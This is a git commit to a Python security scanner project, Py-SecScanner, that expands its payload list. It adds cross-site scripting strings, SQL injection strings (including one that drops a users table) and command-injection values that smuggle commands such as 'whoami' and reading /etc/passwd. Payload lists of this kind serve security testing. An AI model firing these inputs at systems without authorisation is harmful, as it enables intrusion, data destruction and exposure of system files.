2a73035c56c5c8f6120f7719e5626d6e3a75cddc
Giheon Jeon <jgh030814@naver.com>
2026-04-29 14:44:32 +0900

    ✨ Feat: 보안 취약점 페이로드 확장 구현

--- Py-SecScanner/src/scanner/payloads.py
+++ Py-SecScanner/src/scanner/payloads.py
@@ -1,8 +1,24 @@
 PAYLOADS = {
     "xss": [
-        "<script>alert(1)</script>",
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "javascript:alert('XSS')",
+        "'\"><script>alert('XSS')</script>",
+        "<svg onload=alert('XSS')>"
     ],
     "sqli": [
         "' OR '1'='1",
+        "admin' --",
+        "' UNION SELECT NULL, NULL, NULL --",
+        "'; DROP TABLE users; --",
+        "1' OR '1'='1' --"
+    ],
+    "command_injection": [
+        "; ls",
+        "| ls",
+        "&& whoami",
+        "$(whoami)",
+        "; cat /etc/passwd"
     ]
 }
+
